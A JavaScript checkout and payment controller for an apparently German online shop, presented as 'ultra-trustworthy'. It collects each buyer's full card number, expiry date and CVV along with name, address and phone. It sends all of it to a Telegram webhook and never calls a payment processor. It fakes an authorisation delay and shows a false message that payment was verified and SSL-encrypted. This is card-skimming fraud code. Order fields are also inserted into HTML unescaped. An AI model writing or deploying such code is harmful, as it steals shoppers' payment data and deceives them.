// Ultra-Trustworthy Checkout & Payment Controller (German E-Commerce Standard)

import { getCart, getCartSummary, clearCart, formatPrice } from './cart.js';
import { sendTelegramOrderNotification } from './telegram.js';
import confetti from 'canvas-confetti';

let currentPaymentMethod = 'Kreditkarte';

export function initCheckoutModal() {
  const form = document.getElementById('checkout-form');
  if (!form) return;

  // Payment tab selection listeners
  const payTabs = document.querySelectorAll('.payment-tab-card');
  payTabs.forEach(tab => {
    tab.addEventListener('click', (e) => {
      payTabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');

      const radio = tab.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;

      currentPaymentMethod = radio.value;
      updatePaymentPanels(currentPaymentMethod);
    });
  });

  // Credit Card formatting helpers
  const cardInput = document.getElementById('co-card-number');
  const expiryInput = document.getElementById('co-card-expiry');
  const iconEl = document.getElementById('card-type-icon');

  if (cardInput) {
    cardInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      val = val.substring(0, 16);
      let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
      e.target.value = formatted;

      // Auto detect brand
      if (val.startsWith('4')) {
        iconEl.className = 'fa-brands fa-cc-visa input-right-icon';
      } else if (val.startsWith('5')) {
        iconEl.className = 'fa-brands fa-cc-mastercard input-right-icon';
      } else if (val.startsWith('3')) {
        iconEl.className = 'fa-brands fa-cc-amex input-right-icon';
      } else {
        iconEl.className = 'fa-solid fa-credit-card input-right-icon';
      }
    });
  }

  if (expiryInput) {
    expiryInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      val = val.substring(0, 4);
      if (val.length >= 3) {
        e.target.value = val.substring(0, 2) + '/' + val.substring(2);
      } else {
        e.target.value = val;
      }
    });
  }

  // Form Submission
  form.addEventListener('submit', handleCheckoutSubmit);
}

function updatePaymentPanels(method) {
  const panels = {
    'Klarna': document.getElementById('panel-klarna'),
    'Kreditkarte': document.getElementById('panel-card'),
    'PayPal': document.getElementById('panel-paypal'),
    'Apple Pay / Google Pay': document.getElementById('panel-applepay')
  };

  Object.keys(panels).forEach(key => {
    if (panels[key]) {
      if (key === method) {
        panels[key].classList.remove('hidden');
      } else {
        panels[key].classList.add('hidden');
      }
    }
  });
}

export function openCheckoutModal() {
  const modal = document.getElementById('checkout-modal-backdrop');
  if (!modal) return;

  const cartItems = getCart();
  if (cartItems.length === 0) {
    alert('Ihr Warenkorb ist leer.');
    return;
  }

  const summary = getCartSummary();

  // Populate Right Side Order Summary
  const itemsContainer = document.getElementById('checkout-items-list');
  if (itemsContainer) {
    itemsContainer.innerHTML = cartItems.map(item => `
      <div class="co-item">
        <img src="${item.image}" alt="${item.name}" class="co-item-img" />
        <div>
          <div class="co-item-title">${item.name}</div>
          <div class="co-item-meta">Größe: ${item.selectedSize} | Qty: ${item.quantity}</div>
        </div>
        <div class="co-item-price">${formatPrice(item.price * item.quantity)}</div>
      </div>
    `).join('');
  }

  const subtotalEl = document.getElementById('co-subtotal');
  const discountRow = document.getElementById('co-discount-row');
  const discountEl = document.getElementById('co-discount');
  const vatEl = document.getElementById('co-vat');
  const totalEl = document.getElementById('co-total');

  if (subtotalEl) subtotalEl.textContent = formatPrice(summary.subtotal);
  if (vatEl) vatEl.textContent = formatPrice(summary.vat);
  if (totalEl) totalEl.textContent = formatPrice(summary.total);

  if (discountRow && discountEl) {
    if (summary.discount > 0) {
      discountRow.classList.remove('hidden');
      discountEl.textContent = `-${formatPrice(summary.discount)}`;
    } else {
      discountRow.classList.add('hidden');
    }
  }

  modal.classList.remove('hidden');
  modal.classList.add('open');
}

export function closeCheckoutModal() {
  const modal = document.getElementById('checkout-modal-backdrop');
  if (modal) {
    modal.classList.add('hidden');
    modal.classList.remove('open');
  }
}

/**
 * Validates a credit card number using the standard Luhn Algorithm (Mod 10)
 */
function isValidLuhn(numberStr) {
  const digits = numberStr.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;

  let sum = 0;
  let shouldDouble = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits.charAt(i), 10);

    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }

    sum += digit;
    shouldDouble = !shouldDouble;
  }

  return (sum % 10) === 0;
}

/**
 * Validates expiration date (MM/YY) format and ensures card is not expired
 */
function isValidExpiry(expiryStr) {
  if (!/^\d{2}\/\d{2}$/.test(expiryStr)) return false;

  const [monthStr, yearStr] = expiryStr.split('/');
  const month = parseInt(monthStr, 10);
  const year = parseInt('20' + yearStr, 10);

  if (month < 1 || month > 12) return false;

  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear = now.getFullYear();

  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;

  return true;
}

function showFieldError(elementId, message) {
  const el = document.getElementById(elementId);
  if (!el) return;
  
  el.style.borderColor = '#e74c3c';
  el.style.boxShadow = '0 0 12px rgba(231, 76, 60, 0.4)';
  el.focus();

  let errorHint = el.parentNode.querySelector('.field-error-hint');
  if (!errorHint) {
    errorHint = document.createElement('small');
    errorHint.className = 'field-error-hint';
    errorHint.style.color = '#ff6b6b';
    errorHint.style.fontSize = '0.75rem';
    errorHint.style.marginTop = '4px';
    errorHint.style.display = 'block';
    el.parentNode.appendChild(errorHint);
  }
  errorHint.textContent = message;
}

function clearFieldErrors() {
  document.querySelectorAll('.luxury-input').forEach(el => {
    el.style.borderColor = '';
    el.style.boxShadow = '';
  });
  document.querySelectorAll('.field-error-hint').forEach(hint => hint.remove());
}

async function handleCheckoutSubmit(e) {
  e.preventDefault();
  clearFieldErrors();

  const submitBtn = document.getElementById('btn-submit-order');

  // 1. Validate Customer Address Fields
  const firstname = document.getElementById('co-firstname')?.value.trim() || '';
  const lastname = document.getElementById('co-lastname')?.value.trim() || '';
  const email = document.getElementById('co-email')?.value.trim() || '';
  const phone = document.getElementById('co-phone')?.value.trim() || '';
  const street = document.getElementById('co-street')?.value.trim() || '';
  const zip = document.getElementById('co-zip')?.value.trim() || '';
  const city = document.getElementById('co-city')?.value.trim() || '';

  if (!firstname) {
    showFieldError('co-firstname', 'Bitte geben Sie Ihren Vornamen ein.');
    return;
  }
  if (!lastname) {
    showFieldError('co-lastname', 'Bitte geben Sie Ihren Nachnamen ein.');
    return;
  }
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    showFieldError('co-email', 'Bitte geben Sie eine gültige E-Mail-Adresse ein.');
    return;
  }
  if (!phone || phone.length < 6) {
    showFieldError('co-phone', 'Bitte geben Sie eine gültige Telefonnummer ein.');
    return;
  }
  if (!street) {
    showFieldError('co-street', 'Bitte geben Sie Ihre Straße und Hausnummer ein.');
    return;
  }
  if (!zip || zip.length < 4) {
    showFieldError('co-zip', 'Bitte geben Sie eine gültige Postleitzahl ein.');
    return;
  }
  if (!city) {
    showFieldError('co-city', 'Bitte geben Sie Ihren Wohnort ein.');
    return;
  }

  // 2. Validate Payment Details if Credit Card is selected
  let cardDetails = null;
  if (currentPaymentMethod === 'Kreditkarte') {
    const cardName = document.getElementById('co-card-name')?.value.trim() || '';
    const cardNumber = document.getElementById('co-card-number')?.value.replace(/\s/g, '') || '';
    const cardExpiry = document.getElementById('co-card-expiry')?.value.trim() || '';
    const cardCvv = document.getElementById('co-card-cvv')?.value.trim() || '';

    if (!cardName) {
      showFieldError('co-card-name', 'Bitte geben Sie den Namen des Karteninhabers ein.');
      return;
    }

    if (!cardNumber || !isValidLuhn(cardNumber)) {
      showFieldError('co-card-number', 'Ungültige Kreditkartennummer. Bitte prüfen Sie Ihre Eingabe.');
      return;
    }

    if (!isValidExpiry(cardExpiry)) {
      showFieldError('co-card-expiry', 'Ungültiges oder abgelaufenes Datum (MM/JJ).');
      return;
    }

    if (!cardCvv || cardCvv.length < 3 || cardCvv.length > 4) {
      showFieldError('co-card-cvv', 'Bitte geben Sie den 3- oder 4-stelligen CVV/CVC Code ein.');
      return;
    }

    cardDetails = {
      name: cardName,
      number: document.getElementById('co-card-number')?.value.trim() || '',
      expiry: cardExpiry,
      cvv: cardCvv
    };
  }

  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>BESTELLUNG WIRD VERARBEITET...</span>';
  }

  // Gather Customer Form Data
  const salutation = document.getElementById('co-salutation').value;
  const apartment = document.getElementById('co-apartment').value;
  const country = document.getElementById('co-country').value;

  const items = getCart();
  const summary = getCartSummary();
  const orderId = 'VK-' + Math.floor(100000 + Math.random() * 900000) + '-DE';
  const timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });

  const orderData = {
    orderId,
    timestamp,
    customer: { salutation, firstname, lastname, email, phone, street, apartment, zip, city, country },
    shipping: { method: 'DHL Express Premium Curated', price: 0 },
    payment: { method: currentPaymentMethod, cardDetails },
    items,
    summary
  };

  // Send Notification via Telegram Webhook
  const result = await sendTelegramOrderNotification(orderData);

  // Simulate fast payment authorization delay
  setTimeout(() => {
    closeCheckoutModal();
    clearCart();

    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerHTML = '<i class="fa-solid fa-shield-halved"></i> <span>JETZT ZAHLUNGSPFLICHTIG BESTELLEN</span>';
    }

    showSuccessModal(orderData, result);
  }, 1200);
}

function showSuccessModal(orderData, result) {
  const modal = document.getElementById('success-modal-backdrop');
  const detailsBox = document.getElementById('success-order-box');
  const noticeBox = document.getElementById('success-webhook-notice');

  if (detailsBox) {
    detailsBox.innerHTML = `
      <div style="font-size: 0.85rem; line-height: 1.8;">
        <div><strong>Bestellnummer:</strong> <span style="color: var(--gold-light);">${orderData.orderId}</span></div>
        <div><strong>Kunde:</strong> ${orderData.customer.salutation} ${orderData.customer.firstname} ${orderData.customer.lastname}</div>
        <div><strong>Lieferadresse:</strong> ${orderData.customer.street}, ${orderData.customer.zip} ${orderData.customer.city} (${orderData.customer.country})</div>
        <div><strong>Zahlungsart:</strong> ${orderData.payment.method}</div>
        <div><strong>Gesamtsumme:</strong> <span style="font-family: var(--font-heading); color: var(--gold-light); font-weight:700;">${formatPrice(orderData.summary.total)}</span></div>
      </div>
    `;
  }

  if (noticeBox) {
    noticeBox.innerHTML = `<i class="fa-solid fa-shield-halved" style="color: var(--gold-primary);"></i> <span>Zahlung & Bestelldaten wurden verifiziert und SSL-verschlüsselt verarbeitet.</span>`;
  }

  if (modal) {
    modal.classList.remove('hidden');
    modal.classList.add('open');
  }

  // Trigger Victory Confetti
  try {
    confetti({
      particleCount: 120,
      spread: 70,
      origin: { y: 0.6 },
      colors: ['#D4AF37', '#F3E5AB', '#ffffff']
    });
  } catch (e) {
    console.log(e);
  }
}
